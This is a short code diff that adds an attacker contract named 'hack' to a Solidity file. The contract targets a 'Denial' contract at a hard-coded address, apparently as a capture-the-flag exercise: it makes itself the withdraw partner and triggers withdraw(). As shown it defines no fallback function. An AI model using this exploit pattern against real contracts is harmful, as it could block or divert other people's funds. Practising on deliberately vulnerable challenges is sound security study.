@@ -31,3 +31,14 @@ contract Denial {
         return address(this).balance;
     }
 }
+
+
+contract hack {
+    Denial a = Denial(0x32eF8629d2FA8D6953e938b444FE463A0367C22e);
+    
+    function hack1() public {
+        a.setWithdrawPartner(address(this));
+        a.withdraw();
+    }
+    
+}
